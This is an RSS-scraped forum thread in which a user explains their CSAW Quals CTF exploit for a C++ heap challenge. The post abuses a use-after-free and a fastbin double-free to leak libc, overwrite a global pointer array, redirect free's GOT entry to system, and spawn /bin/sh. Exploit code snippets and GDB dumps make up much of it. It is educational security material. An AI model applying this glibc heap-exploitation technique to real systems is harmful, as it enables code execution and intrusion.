        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <ul>
<li>
<strong>Aye</strong>, awesome article man! <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">
</li>
</ul>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/4</link>
        <pubDate>Mon, 18 Sep 2017 18:13:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-4</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Keep in mind they are called “pwnables” for a reason <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> <code>malloc</code> and <code>free</code> were purposely used because their internals are more known and thus kinda “easier” to exploit.</p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/3</link>
        <pubDate>Mon, 18 Sep 2017 14:48:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-3</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Working my way through this:</p>
<p>First comment: C++ code that uses <code>malloc</code> and <code>free</code>? This is how you know the author went to college!</p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/2</link>
        <pubDate>Mon, 18 Sep 2017 14:45:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-2</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Sup folks! I hope you’re doing great! CSAW Quals took place the past weekend and <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> and myself teamed up for some binary exploitation session. He’s actually so good that he pwned a <strong>500</strong> point binary!</p>
<p>Interestingly enough, there was a heap exploitation-related pwnable which covered a concept I planned on covering after my <a href="https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580">UAF</a> write-up, so I decided to tackle it and here I am, about to explain to you the whys and hows of my exploit. This time I’ll go full ascii-art on you.</p>
<p>By the way, if this is your first time ever hearing about heap exploitation, it’d be wise to check out the UAF write-up I linked above along with the resource links that can be found in it.</p>
<p>Without further ado, let’s get right into!</p>
<hr>
<h3><em>Binary Review</em></h3>
<pre><code class="lang-makefile">RELRO           STACK CANARY      NX            PIE          
Partial RELRO   No canary found   NX enabled    No PIE 
</code></pre>
<pre><code class="lang-makefile">
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME

</code></pre>
<p>We can allocate chunks, free them, edit them and dump their content. There isn’t much else to say so let’s dive in the assembly for some bug hunting.</p>
<hr>
<h3><em>Reverse Engineering</em></h3>
<p>The binary was in C++ (the disassembly of C++ isn’t the same as C and sometimes can be scary too) for the most part but the bug itself wasn’t related to that fact. Instead of messing around with C++'s assembly line-by-line, I spotted the functions that allocate / free chunks and checked for heap-related bugs.</p>
<pre><code class="lang-auto">              [...]
00401621  mov     rsi, qword [rbp-0x80]
00401625  movsxd  rdi, dword [rsi]
00401628  mov     rdi, qword [rdi*8+0x605310]
00401630  mov     qword [rbp-0xa0], rax
00401637  call    free
              [...]
</code></pre>
<p>This is the meat of the binary. We’ve got a global array of malloc’d pointers at <code>0x605310</code> and <code>free</code> being called on them. However, those pointers aren’t being zeroed out by the program, meaning we abuse UAF to leak libc pointers and we can extend this UAF and turn into a double-free bug in order to perform a fastbin attack (will explain it in detail later on, no worries).</p>
<p>Although the binary is overall messy, we can get a pretty accurate idea of what’s up with its functionality just with the above lines of assembly. Let’s develop a visual image of how the binary actually handles the heap while stepping through my exploit.</p>
<hr>
<p>###<em>Exploit Visualization</em></p>
<pre><code class="lang-python">alloc(0x80, 'A'*10) # chunk 1
alloc(0x80, 'B'*10) # chunk 2
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0
0x617c20:	0x4141414141414141	0x00000000000a4141
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 1
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<p>Looks good so far. So once an allocation takes place, we get to choose the size of the chunk and then we enter a description for it (no overflow).</p>
<p>With just those 2 allocated chunks we can get a libc leak thanks to the UAF bug. We’ll free <code>chunk 0</code> in order to make that happen. Why not free <code>chunk 1</code> you ask? Let’s have a look at <code>free</code>'s source code and find out ourselves.</p>
<pre><code class="lang-auto">static void
_int_free (mstate av, mchunkptr p, int have_lock)
              
                [...]

/*
   If the chunk borders the current high end of memory,
   consolidate into top
*/

else {
   size += nextsize;
   set_head(p, size | PREV_INUSE);
   av-&gt;top = p;
   check_chunk(av, p);
}

                [...]
</code></pre>
<p>Fortunately <code>free</code>'s source code is well documented so just by reading the above code and with a quick assumption test in GDB we can translate this to something intuitive.</p>
<pre><code class="lang-makefile">gef➤  x/40gx 0x0000000000617c20 - 16
0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0
0x617c20:	0x4141414141414141	0x00000000000a4141
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000000	0x0000000000020361 &lt;-- new top chunk
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1
</code></pre>
<p>As you can see we free’d chunk 1 and since its next chunk was the top chunk / wilderness, they got consolidated into a bigger top chunk to be used for further allocation requests. Note that there are no forward  / backward in that area. Top chunk’s address is taken from the <code>main_arena</code> structure in libc’s address space and thus there’s no reason to keep track of it via linked lists etc.</p>
<p>Now that we’ve excluded the de-allocation of the chunk whose bordering chunk is the wilderness, let’s move on with our plan.</p>
<pre><code class="lang-python">free(0)
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0 [free]
0x617c20:	0x00007ffff7530b78	0x00007ffff7530b78
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000090	0x0000000000000090 &lt;-- chunk 1 [in use]
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1
</code></pre>
<p>Note how chunk 1’s size went from <strong>0x91</strong> to <strong>0x90</strong> to indicate that its previous chunk is <strong>free</strong>. Be careful though, when it comes to chunks of fastbin size, their lsb (least significant bit) remains set for speed purposes.</p>
<p>As you can see chunk 0’s area got populated with 2 pointers of same nature and value. They are pointer to libc’s main arena structure. Libc keeps track of the free’d chunks by storing their pointers in an array of pointers whose each entry is a linked list of a certain size. The chunks I allocated were purposely of size <code>0x90</code>, which indicates that they are of smallbin size (fastbins’ max size is <code>0x80</code>), which means they will be placed in a circular double-linked list. Have a look at this awesome <a href="https://imgur.com/a/UDkUV" rel="nofollow noopener">image</a> by this <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" rel="nofollow noopener">article</a> to get a feel of what’s going on, it’s not that complicated.</p>
<p>Moving on, we now have a libc leak which officially marks the success of our first objective, getting the base address of libc.</p>
<pre><code class="lang-python">
leak = dump(0)
libc = leak - 0x3c4b78
</code></pre>
<p>We’re one step closer to total pwning. It’s time to take advantage of the double-free form of UAF and bring the flag home.</p>
<hr>
<p>###<em>Fastbin Attack</em></p>
<p>Before I begin explaining the hows and whys of the fastbin attack, I’d like to give a huge shoutout to shellphish who created the <a href="https://github.com/shellphish/how2heap" rel="nofollow noopener">how2heap</a> repo which basically documents modern heap exploitation techniques. I highly recommend going through the code examples and figuring out the heap internals by tweaking and debugging.</p>
<p>Let’s get started. First we’ll bring heap to its original state so we can have a fresh start. Though it’s not necessary, I like keeping things clean and simple. Those who were paying close attention can figure out how to do that.</p>
<pre><code class="lang-python">free(1)
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x00000000000203f1 &lt;-- new top chunk
0x617c20:	0x00007ffff7530b78	0x00007ffff7530b78
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- old top chunk
</code></pre>
<p>The heap has been “re-initialized” by consolidating the last remaining chunk with the wilderness / top chunk and it’s ready for new use, or abuse <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>Someone could assume that the fastbin attack is related to fastbins. That’s indeed the case. We’re about to exploit the way <code>malloc</code> serves / checks free’d fast chunks to the user. Let’s create 2 chunks of fastbin size and one of smallbin size to be used as a border in order to prevent consolidation (don’t pay attention on that one).</p>
<pre><code class="lang-python">alloc(0x60, 'C'*10) # chunk 2
alloc(0x60, 'D'*10) # chunk 3
alloc(0x80, 'E'*10) # chunk 4
</code></pre>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2
0x617c20:	0x4343434343434343	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3
0x617c90:	0x4444444444444444	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<p>Free-ing chunk 2 and chunk 3 (the order doesn’t really matter as you’ll notice later on) will create the following structure in libc:</p>
<hr>
<pre><code class="lang-makefile">fastbinsY[] initial state

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
     
</code></pre>
<hr>
<pre><code class="lang-python">free(3)
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x0
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [in use]
0x617c20:	0x4343434343434343	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000000000	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<hr>
<pre><code class="lang-python">free(2)
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --&gt; 0x617c80 --&gt; 0x0
(0x80)     fastbin[6]: 0x0

</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] free(2)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [free]
0x617c20:	0x0000000000617c80	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000000000	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk

</code></pre>
<p>To understand the above drawing, just keep in mind the following:</p>
<hr>
<h2><em>There are 10 fast bins. Each of these bins maintains a single linked list. Addition and deletion happen from the front of this list (LIFO).</em></h2>
<p>In our scenario we have 2 free’d chunks. Once we request a chunk of size <code>0x70</code>, <code>malloc</code> will do the following:</p>
<ul>
<li>
<p>Delete the <strong>head</strong> fastbin chunk of the list and give it back to the user.</p>
</li>
<li>
<p>For the next allocation, place at the <strong>head</strong> of the list the address of the chunk which was found in the previous chunk’s forward pointer field of the chunk that was given back to the user (don’t worry if it sounds complicated, there’ll be more ascii-arts soon).</p>
</li>
</ul>
<p>The 2nd bullet point is the bread and butter of the fastbin attack. What if we were able to overwrite the forward pointer of a fastbin chunk while it’s still in its free list with an address of our choice? That essentially means we would get back an arbitrary pointer where we can write whatever we want. Here’s our write primitive! But no so easy folks, there are 2 requirements we need to take care of first.</p>
<p>First of all, how can we overwrite the forward pointer if there’s no overflow? Well well, we can abuse the UAF in order to <code>free</code> a chunk twice in a certain order. What do I mean by the order?</p>
<pre><code class="lang-auto">if (__builtin_expect (old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}
</code></pre>
<p>The above code checks if the chunk that is about get free’d is the one that is currently at the top / head of the fastbin list. In other words, we can’t <code>free</code> the same chunk twice in a row. But that’s not secure enough! Bypassing this is a piece of cake. All we have to do is <code>free</code> a different chunk in between the double free. Let’s reconstruct the exploit and enter visual mode.</p>
<pre><code class="lang-python"># double-free =&gt; fastbin attack
free(3)
free(2)
free(3)
</code></pre>
<p>We had already analyzed the first 2 <code>free</code>s so let’s continue with the 3rd one.</p>
<pre><code class="lang-python">free(3)
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x617c10 --&gt; 0x617c80
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [free]
0x617c20:	0x0000000000617c80	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000617c10	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545 
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<p>Do you see what I see? We placed the same chunk <strong>twice</strong> in its corresponding free list! Now ask yourselves, what’s going to happen once we request a chunk of size <code>0x70</code>? You already know it by now, <code>malloc</code> will check the <strong>head</strong> of the free list and serve back the chunk. However, because of the way we have constructed the free list thanks to the double-free bug, we get to affect <code>0x617c80</code>'s FD pointer while it’s free! Let’s see it in action.</p>
<pre><code class="lang-python">alloc(0x68, p64(bss))
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --&gt; 0x617c80 --&gt; 0x6052ed 
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<p>Let me remind you of the structure of a fastbin chunk and then just pause and ponder.</p>
<pre><code class="lang-makefile">Fastbin Chunk Structure

    chunk-&gt; +-------------------------------------------+
            |    Size of previous chunk if it's free    |
            +-------------------------------------------+
            |             Size of chunk                 |
      mem-&gt; +-------------------------------------------+
            |    Forward pointer to next chunk in list  |
            +-------------------------------------------+
            |                   ...                     |
            +-------------------------------------------+
</code></pre>
<p>In general, whenever we request a chunk, <code>malloc</code> will serve back a pointer to where <code>mem</code> is pointing to in the ascii-art. Regarding the exploit now, we requested a chunk of size <code>0x68</code> (which wraps around <code>0x70</code> for alignment purposes) and we effectively got access to <code>0x617c80</code> which happens to remain in the free list as well. As it can be seen below, we overwrote the <code>FD</code> field with an address of our choice.</p>
<pre><code class="lang-makefile">0x617c80:	0x0000000000000000	0x0000000000000071 &lt;--  chunk 3 [free &amp; in use]
0x617c90:	0x00000000006052ed &lt;-- FD pointer
</code></pre>
<p>Here’s a view of the fastbin list as well:</p>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
</code></pre>
<hr>
<p>The question now is why did we overwrite the <code>FD</code> field with <code>0x6052ed</code>? We somehow need to get our arbitrary (almost) primitive, don’t we?</p>
<p><code>malloc</code> does the following check before it deletes a free fastbin chunk in order to serve it back to the user:</p>
<pre><code class="lang-auto">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = "malloc(): memory corruption (fast)";
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
</code></pre>
<p><code>malloc</code> makes sure there hasn’t been any sort of fastbin corruption by checking if the size of the chunk which is about to be deleted corresponds to the size of this fastbin request (max <code>0x80</code>) . How do we bypass that? There are a few ways to get around it but here’s my thought process:</p>
<ul>
<li>
<p>The binary has partial RELRO, which means the Global Offset Table is still writable.</p>
</li>
<li>
<p>If the binary had full RELRO, we can still get around it by overwriting the <code>__malloc_hook</code> function pointer in libc (which is the subject of a future post).</p>
</li>
<li>
<p>So how we overwrite an entry in GOT? The binary keeps track of the allocated objects in a global array of pointers. If we could somehow overwrite one of those pointers with a GOT address and then call the <code>edit</code> function, we can overwrite its content with a function of our taste, such as <code>system</code>!</p>
</li>
</ul>
<p>Let’s inspect the memory around that global array which is at address <code>0x605310</code>.</p>
<pre><code class="lang-makefile">gef➤  x/6gx 0x605310
0x605310:	0x0000000000617c20	0x0000000000617cb0
0x605320:	0x0000000000617c20	0x0000000000617c90
0x605330:	0x0000000000617d00	0x0000000000617c90
</code></pre>
<p>The entries are looking good. Now what if there’s an address <strong>before</strong> the global array’s address where at offset <code>+0x8</code> there is a value of a legitimate fastbin size. After a bit of trial and error, here’s our savior!</p>
<pre><code class="lang-makefile">gef➤  x/40gx 0x6052ed
0x6052ed:   0xfff753162000007f	0x000000000000007f
0x6052fd:	0x0000000000000000	0x0000000000000000
0x60530d:	0x0000617c20000000	0x0000617cb0000000
0x60531d:	0x0000617c20000000	0x0000617c90000000
0x60532d:	0x0000617d00000000	0x0000617c90000000
</code></pre>
<p>Who would’ve thought, now we’re talking! <code>0x6052ed</code> is right below <code>0x605310</code>, <code>0x23</code> below to be precise, which is enough to overflow the entire array since our allocation was of size <code>0x70</code>! And the best part, at offset <code>+0x8</code> there is <code>0x7f</code>, which is a legitimate fastbin chunk size! You might noticed that the address entries are misaligned, but that doesn’t bother us, we will make sure to surgically overflow the entries such that one of them points to a GOT entry! Game over!</p>
<p>Let’s keep stepping through the exploit and see the magic happen.</p>
<pre><code class="lang-python">alloc(0x68, "F")
</code></pre>
<pre><code class="lang-makefile">gef➤ printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x6052ed
(0x80)     fastbin[6]: 0x0

</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-python">alloc(0x68, "G")
</code></pre>
<pre><code class="lang-makefile">gef➤  printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x6052ed 
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
</code></pre>
<hr>
<p>Off to the last part, on the next allocation we’ll get back <code>0x6052ed</code> and we’ll overflow the 1st and 2nd entry of the global array to point to <code>free</code>'s GOT entry and <code>sh</code>'s address respectively.</p>
<pre><code class="lang-python">alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh))
</code></pre>
<pre><code class="lang-makefile">gef➤  printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
</code></pre>
<pre><code class="lang-makefile">gef➤  x/5gx 0x605310
0x605310:	0x0000000000605060	0x00007ffff72f8d17
0x605320:	0x0000000000617c0a	0x0000000000617c90
0x605330:	0x0000000000617d00

gef➤  x/gx 0x0000000000605060
0x605060:	0x00007ffff71f04f0

gef➤  x 0x00007ffff71f04f0
0x7ffff71f04f0 &lt;__GI___libc_free&gt;:	0x8348535554415541

gef➤  x/s 0x00007ffff72f8d17
0x7ffff72f8d17:	"/bin/sh"
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                        
</code></pre>
<p>Brilliant! Let’s pwn this binary once and for all.</p>
<hr>
<p>###<em>Pwning Time</em></p>
<ul>
<li>
<p>The <code>edit</code> function receives an index as input and then picks the corresponding entry from the global array in order to overwrite its content with our desired input. I picked <code>free</code> as the victim GOT entry because it receives one argument, like <code>system</code>.</p>
</li>
<li>
<p>When we’re asked to de-allocate a chunk, we provide an index once again and <code>free</code> will be called (or would be called since we’ll overwrite it <code>system</code>'s address) with an address from the global array as an argument.</p>
</li>
<li>
<p>Since we overwrote the 1st entry with <code>system</code>'s address and the 2nd one with <code>sh</code>'s address, once de-allocation takes place and we provide <code>1</code> as the index (arrays are indexed from 0), <code>system</code> will take over control and execute whatever command is at the address which was found in the global array. There’s our shell!</p>
</li>
</ul>
